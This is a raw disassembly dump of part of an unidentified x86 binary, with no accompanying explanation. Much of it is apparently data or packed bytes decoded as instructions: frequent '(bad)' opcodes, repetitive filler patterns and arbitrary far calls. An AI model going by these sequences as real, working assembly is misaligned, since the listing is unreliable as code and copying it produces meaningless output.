  4088bb:	(bad)
  4088be:	pop    es
  4088bf:	mov    ebx,0xbb0000d8
  4088c4:	fadd   DWORD PTR [eax]
  4088c6:	add    BYTE PTR [edx+0x32],ah
  4088c9:	add    al,BYTE PTR [eax]
  4088cb:	bound  esi,QWORD PTR [edx]
  4088cd:	add    al,BYTE PTR [eax]
  4088cf:	bound  esi,QWORD PTR [edx]
  4088d1:	add    al,BYTE PTR [eax]
  4088d3:	bound  esi,QWORD PTR [edx]
  4088d5:	add    bh,bh
  4088d7:	popa   
  4088d8:	mov    WORD PTR [edi],ds
  4088da:	(bad)  
  4088db:	fnsave [edi+ebx*1-0x1]
  4088df:	xor    al,BYTE PTR gs:[edx]
  4088e2:	add    BYTE PTR [edx+0x32],ah
  4088e5:	add    al,BYTE PTR [eax]
  4088e7:	bound  esi,QWORD PTR [edx]
  4088e9:	add    al,BYTE PTR [eax]
  4088eb:	bound  esi,QWORD PTR [edx]
  4088ed:	add    al,BYTE PTR [eax]
  4088ef:	bound  esi,QWORD PTR [edx]
  4088f1:	add    al,BYTE PTR [eax]
  4088f3:	(bad)  
  4088f4:	les    ebx,FWORD PTR [esi]
  4088f6:	call   FWORD PTR [ebp-0x35]
  4088f9:	push   ds
  4088fa:	call   DWORD PTR [ebp-0x4d]
  4088fd:	push   ds
  4088fe:	dec    ebp
  408900:	xor    al,BYTE PTR [edx]
  408902:	add    BYTE PTR [edx+0x32],ah
  408905:	add    al,BYTE PTR [eax]
  408907:	bound  esi,QWORD PTR [edx]
  408909:	add    al,BYTE PTR [eax]
  40890b:	bound  esi,QWORD PTR [edx]
  40890d:	add    al,BYTE PTR [eax]
  40890f:	bound  esi,QWORD PTR [edx]
  408911:	add    al,BYTE PTR [eax]
  408913:	bound  eax,QWORD PTR [ebx]
  408915:	pop    ds
  408916:	call   FWORD PTR ds:0x15ff1f0b
  40891c:	repz push ds
  40891e:	inc    DWORD PTR [eax]
  408920:	lea    esi,[edx]
  408922:	add    al,BYTE PTR [eax]
  408924:	bound  esi,QWORD PTR [edx]
  408926:	add    al,BYTE PTR [eax]
  408928:	bound  esi,QWORD PTR [edx]
  40892a:	add    al,BYTE PTR [eax]
  40892c:	bound  esi,QWORD PTR [edx]
  40892e:	add    al,BYTE PTR [eax]
  408930:	bound  esi,QWORD PTR [edx]
  408932:	add    al,BYTE PTR [eax]
  408934:	bound  eax,QWORD PTR [esp+ebx*1+0x0]
  408938:	fidiv  WORD PTR [eax]
  40893a:	add    al,BYTE PTR [eax]
  40893c:	fidiv  DWORD PTR [eax]
  40893e:	add    al,BYTE PTR [eax]
  408940:	dec    edx
  408941:	(bad)  
  408943:	add    esp,DWORD PTR [edx-0x27]
  408946:	out    0x3,eax
  408948:	(bad)  
  408949:	(bad)  
  40894b:	add    esp,DWORD PTR [edx-0x27]
  40894e:	out    0x3,eax
  408950:	(bad)  
  408951:	fld    st(6)
  408953:	sbb    eax,0x3e843a5
  408958:	(bad)  
  408959:	(bad)  
  40895b:	add    esp,DWORD PTR [edx-0x27]
  40895e:	out    0x3,eax
  408960:	bound  ebx,QWORD PTR [ecx-0x18]
  408963:	add    esp,DWORD PTR [edx-0x27]
  408966:	out    0x3,eax
  408968:	(bad)  
  408969:	(bad)  
  40896b:	add    esp,DWORD PTR [edx-0x27]
  40896e:	out    0x3,eax
  408970:	(bad)  
  408971:	fldenv [edi+0x4]
  408974:	(bad)  
  408975:	(bad)  
  408977:	add    esp,DWORD PTR [edx-0x27]
  40897a:	out    0x2,eax
  40897c:	arpl   cx,bx
  40897e:	call   0xe819eb85
  408983:	add    eax,DWORD PTR [eax]
  408985:	(bad)  
  408986:	(bad)  
  408988:	add    esp,DWORD PTR [edx-0x27]
  40898b:	out    0x3,eax
  40898d:	(bad)  
  40898e:	(bad)  
  408990:	add    esp,DWORD PTR [edx-0x27]
  408993:	call   0x6819eb9b
  408998:	add    al,0x62
  40899a:	fldenv [edi-0x7c]
  40899d:	loop   0x4089f8
  40899f:	call   0x41a6ba7
  4089a4:	add    BYTE PTR [esi-0x1b],ah
  4089a7:	sti    
  4089a8:	call   FWORD PTR [ecx-0x1b]
  4089ab:	repz push ebp
  4089ae:	inc    edx
  4089af:	call   0xe899ebb7
  4089b4:	stc    
  4089b5:	dec    ebx
  4089b6:	(bad)  
  4089b8:	stc    
  4089b9:	jnp    0x4089a2
  4089bb:	add    bl,bl
  4089bd:	shr    eax,cl
  4089bf:	adc    bl,bl
  4089c1:	shr    eax,cl
  4089c3:	adc    bh,bl
  4089c5:	shr    eax,cl
  4089c7:	adc    bh,bl
  4089c9:	mov    bl,0xe8
  4089cb:	adc    bh,bl
  4089cd:	mov    bl,0xe8
  4089cf:	sub    BYTE PTR [ecx+0x61],0x59
  4089d3:	adc    ecx,ebp
  4089d5:	stos   DWORD PTR es:[edi],eax
  4089d6:	loopne 0x4089f2
  4089d8:	jecxz  0x408975
  4089da:	loopne 0x4089ee
  4089dc:	fist   DWORD PTR [ebx-0x6c24ed18]
  4089e2:	call   0xe8d484f9
  4089e7:	adc    bh,bl
  4089e9:	add    BYTE PTR [ebx-0x18],dh
  4089ec:	adc    bh,bl
  4089ee:	jae    0x4089d8
  4089f0:	sub    BYTE PTR [ecx+0x61],0xd9
  4089f4:	add    cl,ch
  4089f6:	popa   
  4089f7:	fld    DWORD PTR [eax]
  4089f9:	jmp    0xe941635f
  4089fe:	popa   
  4089ff:	fld    DWORD PTR [eax]
  408a01:	jmp    0xe9416367
  408a06:	popa   
  408a07:	fld    DWORD PTR [eax]
  408a09:	jmp    0xe941636f
  408a0e:	popa   
  408a0f:	fld    DWORD PTR [eax]
  408a11:	jmp    0xe9416377
  408a16:	popa   
  408a17:	fld    DWORD PTR [eax]
  408a19:	jmp    0xe941637f
  408a1e:	popa   
  408a1f:	fld    DWORD PTR [eax]
  408a21:	jmp    0xe9416387
  408a26:	popa   
  408a27:	fld    DWORD PTR [eax]
  408a29:	jmp    0xe941638f
  408a2e:	popa   
  408a2f:	fld    DWORD PTR [eax]
  408a31:	jmp    0x416397
  408a36:	sti    
  408a37:	aad    0x0
  408a39:	add    bl,cl
  408a3b:	aad    0x0
  408a3d:	add    bl,cl
  408a3f:	aad    0x0
  408a41:	add    BYTE PTR [ebx-0x44ffff2b],bh
  408a47:	aad    0x0
  408a49:	add    bl,cl
  408a4b:	aad    0x0
  408a4d:	add    BYTE PTR [eax],al
  408a4f:	retf   
  408a50:	aad    0x0
  408a52:	add    BYTE PTR [ebx-0x44ffff2b],bh
  408a58:	aad    0x0
  408a5a:	add    BYTE PTR [ebx-0x74ffff2b],cl
  408a60:	aad    0x0
  408a62:	add    BYTE PTR [ebx-0x2b],bh
  408a65:	add    BYTE PTR [eax],al
  408a67:	jnp    0x408a3e
  408a69:	add    BYTE PTR [eax],al
  408a6b:	mov    edx,ebp
  408a6d:	add    BYTE PTR [eax],al
  408a6f:	mov    edx,ebp
  408a71:	add    BYTE PTR [eax],al
  408a73:	jnp    0x408a4a
  408a75:	add    BYTE PTR [eax],al
  408a77:	adc    al,0xa6
  408a79:	cmp    BYTE PTR [ecx],dl
  408a7b:	stos   BYTE PTR es:[edi],al
  408a7c:	(bad)  
  408a7d:	cmp    BYTE PTR [ecx],dl
  408a7f:	fdivr  st,st(3)
  408a81:	ja     0x408aa3
  408a83:	call   0x37aa:0xdb1138a2
  408a8a:	adc    DWORD PTR [ecx+0x6f6dc942],esi
  408a90:	bound  esp,QWORD PTR [esi+0x500f5152]
  408a96:	mov    eax,0x1a3b3bbc
  408a9b:	jl     0x408a44
  408a9d:	(bad)  [edx-0x67abc246]
  408aa3:	int    0x13
  408aa5:	fwait
  408aa6:	es out dx,eax
  408aa8:	mov    eax,0x1a70a0f9
  408aad:	pop    esi
  408aae:	fisub  DWORD PTR [edx+0x77]
  408ab1:	data16 jno 0x408ab4
  408ab4:	push   ebx
  408ab5:	sbb    al,BYTE PTR [edi+0x12]
  408ab8:	dec    ecx
  408ab9:	fisttp QWORD PTR [ebp+0x6b1ad9f0]
  408abf:	and    al,0xb7
  408ac1:	stos   BYTE PTR es:[edi],al
  408ac2:	mov    al,ds:0x9850c3a4
  408ac7:	cdq    
  408ac8:	push   ebp
  408ac9:	sbb    eax,0x28fcfbd4
  408ace:	nop
  408acf:	aas    
  408ad0:	shr    DWORD PTR [ebx-0x41afa942],cl
  408ad6:	outs   dx,DWORD PTR ds:[esi]
  408ad7:	adc    esp,DWORD PTR [edx]
  408ad9:	ins    DWORD PTR es:[edi],dx
  408ada:	int3   
  408adb:	adc    eax,eax
  408add:	adc    DWORD PTR [ecx+0x6edd2a0c],esp
  408ae3:	pop    ecx
  408ae4:	mov    ch,0xb5
  408ae6:	cs mov edx,0xe909984
  408aec:	addr16 or al,0xf9
  408aef:	cli    
  408af0:	jae    0x408b56
  408af2:	mov    edx,0x117b8306
  408af7:	in     al,0xea
  408af9:	(bad)  
  408afa:	sub    al,0xdf
  408afc:	popf   
  408afd:	mov    ds:0xc1ac2248,eax
  408b02:	mov    ebp,0xa6289bb4
  408b07:	outs   dx,BYTE PTR ds:[esi]
  408b08:	dec    eax
  408b09:	mov    DWORD PTR [esi],0xfbb7a17d
  408b0f:	add    al,0x62
  408b11:	push   esp
  408b12:	and    cl,BYTE PTR [ebx+0x0]
  408b15:	jge    0x408b6c
  408b17:	test   DWORD PTR [eax],eax
  408b19:	fbstp  TBYTE PTR [edx+0x7992ba04]
  408b1f:	add    eax,0x88c0a21b
  408b24:	push   ss
  408b25:	fdivrp st(7),st
  408b27:	dec    edx
  408b28:	push   ds
  408b29:	or     al,0xd9
  408b2b:	les    ebx,FWORD PTR [ebx+0xf]
  408b2e:	inc    ebx
  408b2f:	or     DWORD PTR [esi-0x6a],edx
  408b32:	sub    al,0xb6
  408b34:	dec    eax
  408b35:	xchg   DWORD PTR [esi],edx
  408b37:	push   edx
  408b38:	adc    dl,ah
  408b3a:	inc    ebp
  408b3b:	cli    
  408b3c:	lock jb 0x408b44
  408b3f:	not    DWORD PTR [edi]
  408b41:	xor    bl,ah
  408b43:	arpl   WORD PTR [ebx+0x0],cx
  408b46:	call   0x3f73:0xd54ce85e
  408b4d:	xchg   ebx,eax
  408b4e:	cmp    cl,BYTE PTR [edx+0x2d91e92c]
  408b54:	je     0x408ba9
  408b56:	jle    0x408b9f
  408b58:	repnz mov WORD PTR [edx],?
  408b5b:	lods   al,BYTE PTR ds:[esi]
  408b5c:	fld    TBYTE PTR [edx+0x74]
  408b5f:	bound  ebp,QWORD PTR [ecx+ecx*8]
  408b62:	mov    al,0x79
  408b64:	in     eax,dx
  408b65:	aam    0xbf
  408b67:	pop    ss
  408b68:	sub    edi,DWORD PTR [ebx-0x3c]
  408b6b:	mov    BYTE PTR [eax-0x62],al
  408b6e:	sahf   
  408b6f:	and    eax,0x53af9fc1
  408b74:	jae    0x408b03
  408b76:	and    eax,0x7aefe9ca
  408b7b:	lock xor al,BYTE PTR [eax]
  408b7e:	adc    al,0x4f
  408b80:	enter  0x6522,0x8c
  408b84:	add    DWORD PTR [ecx+0x35ee3888],esp
  408b8a:	sbb    BYTE PTR [edx+0x40],al
  408b8d:	fxch   st(2)
  408b8f:	jge    0x408b79
  408b91:	add    esp,DWORD PTR [edx-0x27]
  408b94:	das    
  408b95:	add    al,0x62
  408b97:	fldenv [edi+0x6]
  408b9a:	(bad)  
  408b9b:	(bad)  [esp+eax*1]
  408b9e:	(bad)  
  408b9f:	fldenv [eax]
  408ba1:	add    al,0x62
  408ba3:	fld    DWORD PTR [eax]
  408ba5:	dec    ecx
  408ba6:	pop    ebx
  408ba7:	fld    DWORD PTR [eax]
  408ba9:	add    al,0x5e
  408bab:	fld    DWORD PTR [eax]
  408bad:	inc    ebx
  408bae:	data16 fld DWORD PTR [eax]
  408bb1:	or     DWORD PTR [ebx-0x27],ebp
  408bb4:	add    ah,cl
  408bb6:	popa   
  408bb7:	fld    DWORD PTR [eax]
  408bb9:	xor    bl,BYTE PTR [esi-0x27]
  408bbc:	add    BYTE PTR [ecx+0x64],ch
  408bbf:	fld    DWORD PTR [eax]
  408bc1:	les    esp,FWORD PTR [ecx-0x27]
  408bc4:	add    BYTE PTR ds:0x6900d966,dl
  408bca:	pop    esp
  408bcb:	fld    DWORD PTR [eax]
  408bcd:	or     al,0x66
  408bcf:	fld    DWORD PTR [eax]
  408bd1:	mov    esp,0x6900d961
  408bd6:	fld    DWORD PTR [bx+si]
  408bd9:	add    al,0x5e
  408bdb:	fld    DWORD PTR [eax]
  408bdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bde:	popa   
  408bdf:	fld    DWORD PTR [eax]
  408be1:	leave  
  408be2:	add    BYTE PTR [edx-0x27],ch
  408be5:	add    BYTE PTR ds:0xe900d966,cl
  408beb:	popa   
  408bec:	fld    DWORD PTR [eax]
  408bee:	push   esp
  408bef:	inc    edi
  408bf0:	rcl    DWORD PTR [edx-0x26],0xa2
  408bf4:	idiv   DWORD PTR [edi+0x64]
  408bf7:	dec    ecx
  408bf8:	fs dec esi
  408bfa:	jl     0x408c5d
  408bfc:	pushf  
  408bfd:	pop    edx
  408bfe:	push   eax
  408bff:	ss xchg ebp,eax
  408c01:	(bad)  
  408c03:	loopne 0x408bb1
  408c05:	and    BYTE PTR [ecx],dh
  408c07:	ins    DWORD PTR es:[edi],dx
  408c08:	sbb    DWORD PTR [eax],edi
  408c0a:	das    
  408c0b:	repnz xlat BYTE PTR ds:[ebx]
  408c0d:	imul   eax,DWORD PTR [edi-0x22e87dc0],0x3ff0f831
  408c17:	adc    BYTE PTR [esi],dh
  408c19:	pop    ebp
  408c1a:	push   edi
  408c1b:	fdivr  st(1),st
  408c1d:	rol    BYTE PTR [eax],1
  408c1f:	call   DWORD PTR [eax+0x2f]
  408c22:	pop    esi
  408c23:	mov    DWORD PTR [ecx+ebp*2+0x7c71c02e],ebx
  408c2a:	je     0x408bbb
  408c2c:	mov    ebx,0x1b0b104f
  408c31:	shl    DWORD PTR [ecx+0x3ce219a4],0xd1
  408c38:	adc    bp,WORD PTR [ecx+0x4a]
  408c3c:	sub    BYTE PTR [edx+0x30],cl
  408c3f:	mov    bh,0x75
  408c41:	xor    DWORD PTR [eax+0x4e],0x4747b1
  408c48:	int    0x60
  408c4a:	es inc edx
  408c4c:	je     0x408bd3
  408c4e:	sbb    eax,0x18c350bb
  408c53:	lods   al,BYTE PTR ds:[esi]
  408c54:	into   
  408c55:	add    dl,0xf2
  408c58:	test   DWORD PTR [ebp-0x23],0xda6de550
  408c5f:	push   edi
  408c60:	xlat   BYTE PTR ds:[ebx]
  408c61:	and    al,0x5b
  408c63:	call   0x9948ff75
  408c68:	ins    BYTE PTR es:[edi],dx
  408c69:	ins    DWORD PTR es:[edi],dx
  408c6a:	cmp    al,0x88
  408c6c:	inc    esi
  408c6d:	inc    esp
  408c6e:	add    eax,DWORD PTR [esi]
  408c70:	add    BYTE PTR [esi+0x3b54840d],dl
  408c76:	ds call 0x718a6032
  408c7c:	aas    
  408c7d:	and    al,0x4a
  408c7f:	xor    DWORD PTR [edi+0x26],edi
  408c82:	pop    edx
  408c83:	xor    DWORD PTR [edi+0x26],ebx
  408c86:	push   0x31
  408c88:	dec    edi
  408c89:	es jp  0x408cbd
  408c8c:	mov    edi,0x98ba8a26
  408c91:	add    DWORD PTR [ecx],edi
  408c93:	cld    
  408c94:	mov    ds:0x6227e991,eax
  408c99:	arpl   WORD PTR ds:0xb49fb7d8,dx
  408c9f:	ret    
  408ca0:	inc    edi
  408ca1:	push   edi
  408ca2:	scas   al,BYTE PTR es:[edi]
  408ca3:	neg    DWORD PTR [ebx+0x2fb390fe]
  408ca9:	mov    ebp,0x5300fbd3
  408cae:	ror    BYTE PTR ss:[ebx],1
  408cb1:	xor    BYTE PTR [esi],bh
  408cb3:	rcr    BYTE PTR [ebx],1
  408cb5:	xor    BYTE PTR [esi],dl
  408cb7:	shr    BYTE PTR [ebx],1
  408cb9:	xor    BYTE PTR [esi],bl
  408cbb:	sar    BYTE PTR [ebx],1
  408cbd:	xor    ah,bl
  408cbf:	pop    es
  408cc0:	retf   0x7e22
  408cc3:	and    eax,0xf222b626
  408cc8:	inc    ebx
  408cc9:	jnp    0x408cf5
  408ccb:	xchg   ebx,eax
  408ccc:	out    0xf2,eax
  408cce:	jge    0x408cd9
  408cd0:	dec    ebp
  408cd1:	adc    al,0x1e
  408cd3:	ds stos BYTE PTR es:[edi],al
  408cd5:	fidiv  DWORD PTR [eax-0x1]
  408cd8:	stos   DWORD PTR es:[edi],eax
  408cd9:	jo     0x408d39
  408cdb:	sar    BYTE PTR [ebx-0x342f8990],1
  408ce1:	push   eax
  408ce2:	pop    esi
  408ce3:	rcr    bl,1
  408ce5:	push   eax
  408ce6:	push   ss
  408ce7:	shr    bl,1
  408ce9:	push   eax
  408cea:	jle    0x408d5a
  408cec:	fldcw  WORD PTR [ebp-0x4fab987e]
  408cf2:	jne    0x408c93
  408cf4:	fucomp st(0)
  408cf6:	leave  
  408cf7:	les    ecx,FWORD PTR [ebx]
  408cf9:	nop
  408cfa:	int    0x72
  408cfc:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  408cfe:	stos   BYTE PTR es:[edi],al
  408cff:	adc    ebp,esp
  408d01:	lods   al,BYTE PTR ds:[esi]
  408d02:	add    bl,BYTE PTR [ecx]
  408d04:	sub    BYTE PTR [ecx-0x6e942e2a],dl
  408d0a:	sar    DWORD PTR ds:[ebx-0x6f],cl
  408d0e:	mov    dh,0xd2
  408d10:	mov    eax,DWORD PTR [eax]
  408d12:	jno    0x408ced
  408d14:	jnp    0x408ce8
  408d16:	fld    DWORD PTR [edi]
  408d18:	test   dl,dl
  408d1a:	pop    ebx
  408d1b:	(bad)  
  408d1c:	aas    
  408d1d:	scas   eax,DWORD PTR es:[edi]
  408d1e:	jae    0x408d17
  408d20:	mov    ds:0x62760a93,al
  408d25:	(bad)  
  408d26:	sbb    eax,0x75ba573f
  408d2b:	loope  0x408d15
  408d2d:	loop   0x408d30
  408d2f:	xchg   ecx,eax
  408d30:	inc    edx
  408d31:	pop    ebp
  408d32:	repz int 0xfb
  408d35:	iret   
  408d36:	pop    ecx
  408d37:	add    eax,0x539cfc4
  408d3c:	fmul   st(7),st
  408d3e:	sub    DWORD PTR ds:0x529cfa4,eax
  408d44:	pushf  
  408d45:	iret   
  408d46:	cmp    DWORD PTR [esi+0x1d],edi
  408d49:	(bad)  
  408d4a:	repz push ebx
  408d4c:	pop    esi
  408d4d:	mov    BYTE PTR [esi],ah
  408d4f:	adc    eax,ebx
  408d51:	pop    ecx
  408d52:	ds xchg ebp,eax
  408d54:	xchg   ecx,eax
  408d55:	loope  0x408cda
  408d57:	xchg   ebx,eax
  408d58:	jbe    0x408ceb
  408d5a:	clc    
  408d5b:	mov    bl,0xdd
  408d5d:	mov    cl,0x3
  408d5f:	mov    dh,0x67
  408d61:	shr    BYTE PTR [ecx-0x462f63fc],1
  408d67:	add    al,0xc4
  408d69:	sar    BYTE PTR [ecx+0x4],1
  408d6c:	mov    esp,0xe40489d0
  408d71:	into   
  408d72:	imul   eax,DWORD PTR [esi],0x9e00f57f
  408d78:	xchg   ebp,eax
  408d79:	jp     0x408d72
  408d7b:	ins    BYTE PTR es:[edi],dx
  408d7c:	outs   dx,BYTE PTR ds:[esi]
  408d7d:	ret    
  408d7e:	jbe    0x408d41
  408d80:	test   al,0xf7
  408d82:	xchg   esp,eax
  408d83:	stos   BYTE PTR es:[edi],al
  408d84:	ja     0x408d6d
  408d86:	lock mov cl,0x38
  408d89:	out    dx,eax
  408d8a:	sbb    eax,DWORD PTR [edi+0x4de600b7]
  408d90:	mov    edi,0x4f2d6533
  408d95:	xor    al,0x7d
  408d97:	and    eax,0x1d85345f
  408d9c:	outs   dx,DWORD PTR ds:[esi]
  408d9d:	xor    al,0x9d
  408d9f:	adc    eax,0xb425347f
  408da4:	push   ecx
  408da5:	adc    esi,DWORD PTR [ebp+esi*1+0xb]
  408da9:	adc    al,0xbc
  408dab:	and    BYTE PTR [eax],cl
  408dad:	inc    ebp
  408dae:	mov    bh,0x1b
  408db0:	dec    ebx
  408db1:	pop    eax
  408db2:	dec    ecx
  408db3:	add    DWORD PTR [ebp-0x18],esi
  408db6:	xchg   esi,eax
  408db7:	fstp   DWORD PTR [ecx-0x21712221]
  408dbd:	fst    QWORD PTR ss:[edi]
  408dc0:	push   DWORD PTR [esi]
  408dc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408dc3:	scas   eax,DWORD PTR es:[edi]
  408dc4:	mov    ?,WORD PTR [esi]
  408dc6:	popf   
  408dc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dc8:	sahf   
  408dc9:	test   DWORD PTR ss:[edi-0x6882c952],ebx
  408dd0:	inc    edi
  408dd1:	mov    al,0x88
  408dd3:	add    bh,BYTE PTR [ebp+0x7f45eed9]
  408dd9:	xor    DWORD PTR [edi+0x48dc5400],ebx
  408ddf:	pop    es
  408de0:	inc    ecx
  408de1:	loop   0x408d64
  408de3:	cmp    eax,0x9268ccd9
  408de8:	(bad)
  408deb:	lds    ebx,FWORD PTR [edi-0x6842c8d2]
  408df1:	ds aaa 
  408df3:	in     eax,0xae
  408df5:	into   
  408df6:	xor    eax,0x35dea6fd
  408dfb:	lds    ebx,FWORD PTR [esi+0x594091ee]
  408e01:	icebp  
  408e02:	out    0xd1,al
  408e04:	ror    DWORD PTR [eax+0x5434004e],cl
  408e0a:	ds retf 0x6869
  408e0e:	les    eax,FWORD PTR [edi+0x70080a64]
  408e14:	lds    eax,FWORD PTR [esi+eax*1]
  408e17:	mov    ch,0x99
  408e19:	or     eax,0xd7b37b2
  408e1e:	retf   0x7337
  408e21:	or     eax,0x1e0f37e2
  408e26:	and    bh,BYTE PTR [eax]
  408e28:	outs   dx,DWORD PTR ds:[esi]
  408e29:	sbb    eax,0x80f03832
  408e2e:	mov    esi,es
  408e30:	(bad)  
  408e31:	mov    ch,0x6d
  408e33:	movntps XMMWORD PTR [edx+0x0],xmm2
  408e37:	sbb    dh,dh
  408e39:	iret   
  408e3a:	sbb    dh,BYTE PTR [eax+0x7d082783]
  408e40:	add    BYTE PTR [esi+ebp*2],bh
  408e43:	pop    es
  408e44:	lds    esi,FWORD PTR [ecx+0x47]
  408e47:	mov    ds:0xb21e2f38,al
  408e4c:	cmp    BYTE PTR [edi+0x7f38c21e],cl
  408e52:	push   ds
  408e53:	sar    BYTE PTR [eax],cl
  408e55:	outs   dx,DWORD PTR ds:[esi]
  408e56:	push   ds
  408e57:	loop   0x408e91
  408e59:	(bad)  
  408e5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e5b:	(bad)  
  408e5c:	pop    eax
  408e5d:	jno    0x408eb9
  408e5f:	mov    dl,0xd9
  408e61:	dec    esi
  408e62:	retf   0x12b3
  408e65:	or     dh,bh
  408e67:	mov    ah,0x2c
  408e69:	ss jmp 0xdcf75853
  408e6f:	adc    al,0x26
  408e71:	xchg   BYTE PTR [ebx+ecx*1+0x620c6f39],al
  408e78:	cmp    DWORD PTR [edi+0xc],ecx
  408e7b:	jb     0x408eb6
  408e7d:	dec    edi
  408e7e:	or     al,0x82
  408e80:	cmp    DWORD PTR [edx-0x4c],esp
  408e83:	retf   
  408e84:	xchg   ebx,eax
  408e85:	fwait
  408e86:	(bad)  
  408e87:	retf   
  408e88:	sub    BYTE PTR [esp+edx*4],bl
  408e8b:	inc    ecx
  408e8c:	fdivp  st(6),st
  408e8e:	gs cmp al,0xf0
  408e91:	in     al,0xa2
  408e93:	cmp    dh,BYTE PTR [ebx]
  408e95:	dec    ebp
  408e96:	out    dx,al
  408e97:	fcom   DWORD PTR [eax-0x4d0623f0]
  408e9d:	jp     0x408ec8
  408e9f:	pandn  mm0,QWORD PTR [esi+0x13cc3e]
  408ea6:	pop    eax
  408ea7:	inc    esi
  408ea8:	int3   
  408ea9:	and    ebx,DWORD PTR [eax-0x32]
  408eac:	into   
  408ead:	xor    ecx,DWORD PTR [eax+0x36]
  408eb0:	int3   
  408eb1:	inc    ebx
  408eb2:	dec    eax
  408eb3:	jle    0x408e81
  408eb5:	push   ebx
  408eb6:	mov    bl,0x9a
  408eb8:	mov    bh,0xe9
  408eba:	fs add eax,0x412e742b
  408ec0:	cdq    
  408ec1:	xchg   dx,ax
  408ec3:	ret    0x79c4
  408ec6:	(bad)  
  408ec7:	adc    edi,DWORD PTR [ebx+0x2f]
  408eca:	call   0xcefa:0xac3c44f9
  408ed1:	ret    
  408ed2:	mov    dh,bh
  408ed4:	into   
  408ed5:	sar    DWORD PTR [eax-0x1a],cl
  408ed8:	into   
  408ed9:	jecxz  0x408f53
  408edb:	push   cs
  408edc:	int3   
  408edd:	repz push 0x6903cc16
  408ee3:	dec    eax
  408ee4:	iret   
  408ee5:	adc    ebx,DWORD PTR [ecx+0x30]
  408ee8:	iret   
  408ee9:	and    ebx,DWORD PTR [ecx-0x18]
  408eec:	int    0x33
  408eee:	dec    ecx
  408eef:	xor    bh,cl
  408ef1:	inc    ebx
  408ef2:	dec    ecx
  408ef3:	or     dh,cl
  408ef5:	push   ebx
  408ef6:	cmp    DWORD PTR [ecx],edx
  408ef8:	xchg   ecx,eax
  408ef9:	cmp    DWORD PTR [eax-0xe669927],esp
  408eff:	repz sbb ecx,edi
  408f02:	loope  0x408ef8
  408f04:	arpl   si,cx
  408f06:	icebp  
  408f07:	repz imul ecx,esi,0x0
  408f0b:	add    esp,esi
  408f0d:	push   ebx
  408f0e:	into   
  408f0f:	adc    esp,esi
  408f11:	cmp    ebp,DWORD PTR [edx+eax*2-0x21]
  408f15:	ficomp WORD PTR [eax]
  408f17:	pop    esp
  408f18:	inc    esp
  408f19:	lock dec edi
  408f1b:	lds    ebp,FWORD PTR [esi]
  408f1d:	jbe    0x408ef8
  408f1f:	paddusw mm1,QWORD PTR [ebp-0x7f54e7d8]
  408f26:	sahf   
  408f27:	addr16 xchg ebp,eax
  408f29:	push   es
  408f2a:	rcl    DWORD PTR [ebp+esi*8-0xaae2fed],cl
  408f31:	sti    
  408f32:	iret   
  408f33:	mov    eax,ds:0x91cfa3f5
  408f38:	cmc    
  408f39:	mov    ecx,edi
  408f3b:	xor    ebp,0xa2f6cf93
  408f41:	ins    BYTE PTR es:[edi],dx
  408f42:	ins    BYTE PTR es:[edi],dx
  408f43:	inc    ebx
  408f44:	leave  
  408f45:	mov    bl,0xf5
  408f47:	stc    
  408f48:	pop    edx
  408f49:	ficomp DWORD PTR [esp+eiz*8+0x62]
  408f4d:	dec    edi
  408f4e:	out    0xb9,al
  408f50:	clc    
  408f51:	std    
  408f52:	(bad)  
  408f53:	jecxz  0x408fc3
  408f55:	mov    dh,0xd3
  408f57:	test   eax,ebp
  408f59:	or     ecx,edi
  408f5b:	shl    esp,0xd3
  408f5e:	shl    BYTE PTR [ecx+0x61d0dbf4],1
  408f64:	mul    bl
  408f66:	into   
  408f67:	jno    0x408f5f
  408f69:	jmp    0x408f39
  408f6b:	inc    ecx
  408f6c:	jae    0x408f6a
  408f6e:	pop    edx
  408f6f:	add    BYTE PTR [eax-0x3da1f0b],dh
  408f75:	xchg   ebx,eax
  408f76:	add    cl,ch
  408f78:	cwde   
  408f79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f7a:	fistp  WORD PTR ss:[ebx+ebx*8]
  408f7e:	or     ah,BYTE PTR ds:0x4470290c
  408f84:	mov    bl,0xbf
  408f86:	adc    DWORD PTR [esi+0x2d],ebx
  408f89:	dec    ebx
  408f8a:	cmp    al,0x6d
  408f8c:	and    eax,0x1d553c7b
  408f91:	imul   edi,DWORD PTR [edi*1-0x5ac3e4eb],0x2d
  408f99:	or     edi,DWORD PTR [ecx*4+0x553c3b25]
  408fa0:	sbb    eax,0x155d3c2b
  408fa5:	fstp   TBYTE PTR [esi]
  408fa7:	in     eax,0x33
  408fa9:	retf   
  408faa:	ds in  eax,dx
  408fac:	xor    edi,ebx
  408fae:	ds adc eax,0xfd3eeb30
  408fb4:	xor    ebx,DWORD PTR [ebx-0x74ec5ac2]
  408fba:	lea    edx,ds:[ebx]
  408fbd:	mov    ebx,0xab13953e
  408fc2:	ds popf 
  408fc4:	adc    ebx,DWORD PTR [ebx+0x3f]
  408fc7:	gs mov al,0x4a
  408fca:	aas    
  408fcb:	ins    DWORD PTR es:[edi],dx
  408fcc:	mov    al,0x7a
  408fce:	aas    
  408fcf:	push   ebp
  408fd0:	mov    al,0x6a
  408fd2:	aas    
  408fd3:	cmp    eax,0x3f1ab000
  408fd8:	and    eax,0xd3f0a90
  408fdd:	nop
  408fde:	cmp    bh,BYTE PTR [edi]
  408fe0:	aad    0x93
  408fe2:	sub    bh,BYTE PTR [edi]
  408fe4:	fst    QWORD PTR [ebx-0x4d1ac226]
  408fea:	retf   0xed3d
  408fed:	mov    dl,0xfa
  408fef:	cmp    eax,0x32087700
  408ff4:	aas    
  408ff5:	xchg   DWORD PTR [ebp+0x56b7af6d],esi
  408ffb:	(bad)  
  408ffc:	cmc    
  408ffd:	loop   0x408fea
  408fff:	mov    al,ds:0x4585b651
  409004:	enter  0xab15,0x84
  409008:	sti    
  409009:	jge    0x408ff1
  40900b:	leave  
  40900c:	and    bh,BYTE PTR [edi-0x4b]
  40900f:	mov    cl,0x4e
  409011:	push   eax
  409012:	xor    bh,dl
  409014:	fidiv  WORD PTR [edx]
  409016:	cli    
  409017:	(bad)  
  409018:	cmp    al,0x71
  40901a:	scas   al,BYTE PTR es:[edi]
  40901b:	pop    ebp
  40901c:	loopne 0x40907b
  40901e:	xchg   esi,eax
  40901f:	jecxz  0x409022
